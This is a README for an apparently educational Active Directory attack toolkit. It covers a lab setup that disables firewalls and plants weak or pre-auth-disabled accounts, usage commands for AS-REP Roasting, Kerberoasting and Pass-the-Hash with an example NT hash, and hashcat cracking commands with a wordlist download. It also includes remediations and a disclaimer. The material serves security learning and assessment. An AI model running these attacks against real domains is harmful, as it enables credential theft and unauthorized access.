# AD Attack Toolkit

Active Directory security assessment tool. Automates enumeration, AS-REP Roasting, Kerberoasting, and Pass-the-Hash against a target domain, and generates a PDF report with findings and remediation steps.

Built as a portfolio tool for the understanding of AD attack vectors, Kerberos protocol weaknesses, and defensive measures.

## What it does

Given a Domain Controller IP and valid domain credentials (or a low privilege one), the toolkit:

1. **Enumerates** all users, groups, and permissions via LDAP
2. **Identifies** users with Kerberos pre-authentication disabled (AS-REP Roasting targets)
3. **Identifies** service accounts with SPNs registered (Kerberoasting targets)
4. **Captures** AS-REP hashes (crackable offline without triggering lockouts)
5. **Captures** TGS hashes from service accounts (crackable offline)
6. **Demonstrates** Pass-the-Hash authentication using NTLM hashes
7. **Generates** a PDF report with executive summary, technical details, and remediations

This tool tests for specific, well-known misconfigurations(It does not bypass any security controls or exploit zero-days)

## Vulnerabilities tested

| Attack | Misconfiguration | Severity |
|--------|-----------------|----------|
| AS-REP Roasting | Kerberos pre-authentication disabled on user accounts | High |
| Kerberoasting | Service accounts with weak passwords and registered SPNs | High |
| Pass-the-Hash | NTLM authentication accepting hashes instead of passwords | Critical |

## Lab setup

The toolkit was developed and tested against a local VirtualBox lab:

- **DC01**: Windows Server 2022 Datacenter Evaluation (Domain Controller)
- **CLIENT01**: Windows 11 Enterprise Evaluation (domain-joined)
- **Attacker**: Linux host (Ubuntu/Mint)
- **Network**: VirtualBox Host-Only adapter (isolated, no internet exposure)
- **Domain**: psychosec.local

### Recreating the lab

1. Download Windows Server 2022 Evaluation ISO from [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022)
2. Download Windows 11 Enterprise Evaluation ISO from [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise)
3. Create VirtualBox Host-Only network:
```bash
   # Create the network interface
   VBoxManage hostonlyif create
   VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
   
   # Assign to vms (or via GUI: Settings → Network → Adapter 1 → Host-Only → vboxnet0)
   VBoxManage modifyvm "DC01" --nic1 hostonly --hostonlyadapter1 vboxnet0
   VBoxManage modifyvm "CLIENT01" --nic1 hostonly --hostonlyadapter1 vboxnet0
```
4. Create DC01 VM (4GB RAM, 2 CPU, 50GB disk), attach Server ISO
5. Create CLIENT01 VM (4GB RAM, 2 CPU, 50GB disk), attach Windows 11 ISO
6. Set both VMs to Host-Only adapter
7. Install Windows Server, set static IP (192.168.56.10),DNS 127.0.0.1 only then promote to Domain Controller:
   ```powershell
   Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
   Install-ADDSForest -DomainName "psychosec.local" -DomainNetBIOSName "PSYCHOSEC" -InstallDns -Force
   # After reboot, disable firewall (lab testing only)
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
   ```
8. Create vulnerable users on DC01 for examples (PowerShell as administrator):
```powershell
   # Populate AD with example users just for educational testing, if not use real data
   # Replace usernames passwords descriptions with your own values if desired
   
   # normal users
   New-ADUser -Name "User One" -SamAccountName "user1" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
   New-ADUser -Name "User Two" -SamAccountName "user2" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
   
   # AS REP Roasting targets (no Kerberos pre authentication)
   New-ADUser -Name "User NoPreauth" -SamAccountName "user.nopreauth" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
   Set-ADAccountControl -Identity "user.nopreauth" -DoesNotRequirePreAuth $true
   
   New-ADUser -Name "Test NoPreauth" -SamAccountName "test.nopreauth" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) -Enabled $true
   Set-ADAccountControl -Identity "test.nopreauth" -DoesNotRequirePreAuth $true
   
   # Kerberoasting targets (service accounts with SPN)
   New-ADUser -Name "SQL Service Account" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "SQLadmin1!" -AsPlainText -Force) -Enabled $true
   setspn -A MSSQLSvc/DC01.psychosec.local:1433 svc_sql
   
   New-ADUser -Name "Backup Service Account" -SamAccountName "svc_backup" -AccountPassword (ConvertTo-SecureString "Backup2023!" -AsPlainText -Force) -Enabled $true
   setspn -A backupservice/DC01.psychosec.local svc_backup
   
   # Domain Admin with a weak password
   New-ADUser -Name "Admin Account" -SamAccountName "admin.test" -AccountPassword (ConvertTo-SecureString "Admin123!" -AsPlainText -Force) -Enabled $true
   Add-ADGroupMember -Identity "Domain Admins" -Members "admin.test"
   
   # Regular Domain Admin for running the toolkit
   New-ADUser -Name "Lab Admin" -SamAccountName "labadmin" -AccountPassword (ConvertTo-SecureString "LabPassword" -AsPlainText -Force) -Enabled $true
   Add-ADGroupMember -Identity "Domain Admins" -Members "labadmin"
```
9. Install Windows11 on CLIENT01 then set static IP (192.168.56.20, DNS 192.168.56.10), disable firewall, then join to domain:
```powershell
   # Disable firewall (only in lab testing )
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
   Join domain via GUI: Settings → System → About → Domain or workgroup → Domain → psychosec.local
   Use labadmin/LabPassword to authenticate the join operation.

## Installation

```bash
python3 -m venv adtoolkit
source adtoolkit/bin/activate
pip install ldap3 impacket reportlab
```

## Usage

### Run full assessment
```bash
python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
  -u labadmin -p "Password" --all
```

### Run full assessment with Pass-the-Hash
```bash
python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
  -u labadmin -p "Password" --all \
  --pth --pth-user admin.helpdesk --nthash 520126a03f5d5a8d836f1c4f34ede7ce
```

### Individual modules
```bash
# Enumeration only
python3 ad_enum.py --dc-ip 192.168.56.10 -u "PSYCHOSEC\labadmin" -p "LabPassword"

# AS-REP Roasting only
python3 asreproast.py --dc-ip 192.168.56.10 --domain psychosec.local

# Kerberoasting only
python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u labadmin -p "LabPassword"

# Pass-the-Hash only
python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.test --nthash 520126...
```

### Cracking captured hashes
Install hashcat and download rockyou wordlist(many common passwords):
```bash
sudo apt update && sudo apt install hashcat -y
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Crack hashes:
```bash
# AS-REP hashes (Hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force

# TGS hashes (Hashcat mode 13100)
hashcat -m 13100 tgs_hashes.txt rockyou.txt --force
```

## Outputs

- `enum_results.json` — full enumeration data
- `asrep_hashes.txt` — AS-REP hashes (Hashcat mode 18200)
- `tgs_hashes.txt` — TGS hashes (Hashcat mode 13100)
- `ad_attack_report.pdf` — assessment report with findings and remediation
- `ad_attack.log` — detailed execution log

## Project structure

```
ad-attack-toolkit/
├── ad_attack.py        # master script, orchestrates all modules + PDF report
├── ad_enum.py          # LDAP enumeration
├── asreproast.py       # AS-REP Roasting
├── kerberoast.py       # Kerberoasting
├── pth.py              # Pass-the-Hash
├── enum_results.json   # enumeration output
├── asrep_hashes.txt    # captured AS-REP hashes
├── tgs_hashes.txt      # captured TGS hashes
├── ad_attack_report.pdf
└── README.md
```

## How the attacks work

**AS-REP Roasting**: when Kerberos pre-authentication is disabled on a user, anyone can request a TGT for that user without proving they know the password. The TGT is encrypted with the user's password, so it can be cracked offline.

**Kerberoasting**: any authenticated domain user can request a TGS for any service with a registered SPN. The TGS is encrypted with the service account's password. If that password is weak, it can be cracked offline.

**Pass-the-Hash**: Windows NTLM authentication uses a challenge-response mechanism based on the password hash, not the plaintext password. If you have the hash, you can authenticate without ever knowing the password.

## Remediation

- Enable Kerberos pre-authentication on all accounts
- Use Group Managed Service Accounts (gMSA) with auto-rotating passwords
- Set service account passwords to 30+ random characters
- Enable Credential Guard to protect NTLM hashes in memory
- Monitor Event IDs 4768, 4769, 4776 for anomalous patterns
- Disable NTLM where possible in favor of Kerberos

## Legal disclaimer

**This tool is for authorized security testing and educational purposes only.**

Never use this tool against systems you do not own or do not have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.

## Built with

- Python 3
- [ldap3](https://ldap3.readthedocs.io/) — LDAP protocol
- [Impacket](https://github.com/fortra/impacket) — Kerberos/SMB/NTLM protocols
- [ReportLab](https://www.reportlab.com/) — PDF generation
- [Hashcat](https://hashcat.net/) — offline hash cracking

## References

- [Impacket examples](https://github.com/fortra/impacket/tree/master/examples)
- [HackTricks AD methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Kerberos explained (Varonis)](https://www.varonis.com/blog/kerberos-authentication-explained)
